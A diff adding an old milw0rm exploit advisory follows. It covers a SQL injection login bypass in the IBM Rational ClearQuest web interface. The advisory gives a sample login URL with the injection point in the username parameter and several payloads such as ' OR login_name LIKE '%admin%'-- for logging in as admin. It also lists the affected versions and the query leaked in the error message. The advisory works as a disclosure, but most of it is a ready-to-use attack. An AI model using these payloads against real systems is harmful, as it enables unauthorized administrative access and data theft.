@@ -1,0 +1,52 @@
++==============================================================+
++   IBM Rational ClearQuest Web Login Bypass (SQL Injection)   +
++==============================================================+
+
+DISCOVERED BY:
+==============
+SecureState
+  sasquatch - swhite@securestate.com
+  rel1k - dkennedy@securestate.com
+
+HOMEPAGE:
+=========
+www.securestate.com
+
+
+AFFECTED AREA:
+===============
+The username field on the login page is where the application is susceptible to SQL injection...
+
+
+SAMPLE URL:
+===========
+http://SERVERNAMEHERE/cqweb/main?command=GenerateMainFrame&ratl_userdb=DATABASENAMEHERE,&test=&clientServerAddress=http://SERVERNAMEHERE/cqweb/login&username='INJECTIONGOESHERE&password=PASSWORDHERE&schema=SCHEMEAHERE&userDb=DATABASENAMEHERE
+
+Log in as "admin":
+==================
+' OR login_name LIKE '%admin%'--
+
+(other variations work as well)
+' OR login_name LIKE 'admin%'--
+' OR LOWER(login_name) LIKE '%admin%'--
+' OR LOWER(login_name) LIKE 'admin%'--
+etc...use your imagination...
+
+Confirmed against:
+==================
+version 7.0.0.1        Label BALTIC_PATCH.D0609.929
+version 7.0.0.0-IFIX02 Label BALTIC_PATCH.D060630
+
+FULL SQL Statement is spit back in error message:
+=================================================
+SELECT
+   master_users.master_dbid, master_users.login_name, master_users.encrypted_password,
+   master_users.email, master_users.fullname, master_users.phone, master_users.misc_info,
+   master_users.is_active, master_users.is_superuser, master_users.is_appbuilder,
+   master_users.is_user_maint, ratl_mastership, ratl_keysite, master_users.ratl_priv_mask
+FROM
+   master_users
+WHERE
+   login_name = 'INJECTION GOES HERE
+
+# milw0rm.com [2007-08-14]
